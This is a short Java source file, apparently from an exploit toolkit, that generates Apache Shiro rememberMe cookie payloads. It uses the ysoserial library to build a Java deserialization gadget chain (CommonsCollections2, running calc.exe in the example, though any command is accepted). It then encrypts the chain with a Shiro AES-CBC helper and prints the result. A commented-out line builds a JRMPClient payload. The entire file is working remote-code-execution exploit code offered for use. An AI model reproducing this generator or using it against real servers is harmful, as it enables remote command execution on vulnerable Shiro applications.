package org.Tools;

import ysoserial.payloads.ObjectPayload;
import static org.Tools.ShiroAesCBC.ShiroAesCBC;
import static org.Tools.setSerial.serial;

public class ysoserial {
    public static byte[] ysoserial(String[] args) throws Exception {
        String payloadType = args[0];
        String command = args[1];
        Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        ObjectPayload payload = (ObjectPayload)payloadClass.newInstance();
        Object object = payload.getObject(command);
        return serial(object);
    }

    public static void main(String[] args) throws Exception {
        //byte[] barr = ysoserial(new String[]{"JRMPClient", "127.0.0.1:1234"});
        //System.out.println(Arrays.toString(barr));
        byte[] barr = ysoserial(new String[]{"CommonsCollections2","calc.exe"});
        String rememberme = ShiroAesCBC(barr);
        System.out.println(rememberme);
    }



}
